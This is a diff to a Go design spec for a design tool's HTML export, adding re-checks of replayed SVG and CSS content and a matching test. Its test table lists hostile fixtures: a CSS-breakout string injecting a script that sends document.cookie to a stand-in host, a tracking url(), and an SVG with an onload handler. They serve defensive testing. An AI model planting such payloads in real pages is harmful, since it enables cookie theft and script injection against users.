@@ -38,7 +38,8 @@ type HTMLOptions struct {
 //   - style is "prop: value" pairs sorted by property name, joined by "; ", no trailing ";";
 //   - text: & < > escaped as &amp; &lt; &gt;, "\n" as <br>; attribute values escape & < > " ;
 //   - image: src="<asset ref>" and alt; svg: Node.SVG verbatim (canonical: root xmlns, well-formed,
-//     ids prefixed with the node id, so two icons in one exported artboard share no id, review I8);
+//     ids prefixed with the node id, so two icons in one exported artboard share no id, review I8;
+//     HTML trusts it, ExportHTML below re-checks it first, re-review RR-M1);
 //   - Locked, X, Y, Revision and EditedBy are never emitted;
 //   - an <a> is emitted with href="#" as its first attribute after data-node.
 // The output parses back through dialect.Parse to the same nodes (ids aside) — the round trip.
@@ -69,6 +70,14 @@ func HTML(d *doc.Doc, nodeID string, o HTMLOptions) (string, error)
 // here without that check: store.Replay applies logged ops with an accept-everything
 // Checker (task 10), and a past revision is loaded from disk. This is the last Go
 // line before a browser.
+// The same threat covers node content, so ExportHTML re-checks that too (re-review
+// RR-M1; a log recorded under an older, looser allowlist replays unchecked): every
+// svg node's Checker{}.SVG(id, Node.SVG) must return Node.SVG byte for byte, and
+// every declaration of every node must pass dialect.CheckDeclaration. The first
+// failure fails the export with ErrUnsafeToken's sibling dialect.ErrUnsafeNode
+// (task 07) wrapped with the node id and the property or "svg" — one error, never a
+// silently dropped declaration. HTML (above) stays a pure writer; only ExportHTML,
+// the bundle's path to a browser, re-checks.
 func ExportHTML(d *doc.Doc, artboardID string, assetPath func(ref string) string) (string, error)
 
 // TokensUsed is every token referenced by var(--x) in the subtree, plus the
@@ -154,6 +163,7 @@ digests match.
 | `TestHTML_escapes` | text `a < b & "c"` and a name with `"` serialise escaped and round-trip | unescaped text (a script vector on re-parse) |
 | `TestHTML_newlines` | text `"a\nb"` emits `a<br>b` | `\n` emitted raw (collapsed by the browser) |
 | `TestExportHTML_standalone` | the output has no `http`, no `src=` outside `assets/`, no `<script`, and one `:root` block with exactly the tokens used | an export that references the canvas |
+| `TestExportHTML_hostileNode` (re-review RR-M1) | the same permissive-`Checker` fixture route, in turn: an svg node whose stored `SVG` is `<svg xmlns="http://www.w3.org/2000/svg" onload="x()"/>`; an svg node whose stored markup is canonical for another node id; a frame with the declaration `margin: 0` (not in the dialect) → each an error that `errors.Is` `dialect.ErrUnsafeNode` and names the node id (and `svg` or `margin`), no string returned; a document built through the real `Checker` exports unchanged | an export that trusts a replayed document's node content (SVG written verbatim, declarations unchecked) |
 | `TestExportHTML_hostileToken` | a fixture document built through `Apply` with a permissive fake `Checker` (as `store.Replay` would), whose artboard uses `var(--brand)`, with `brand` (type `font-family`) set in turn to each of the review's two values — `red}</style><script>fetch('https://x.example/?'+document.cookie)</script><style>` and `url(https://tracker.example/p.png)` → an error that `errors.Is` `dialect.ErrUnsafeToken` and names `brand`, and no string returned; the same document with `brand` = `"Inter", sans-serif` exports | a script or a remote fetch in the bundle's `<slug>.html` the moment a person opens it (review I2) |
 | `TestTokensUsed_transitive` | `--a: var(--b)` used by a node yields `a` and `b` | nested tokens dropped from export |
 
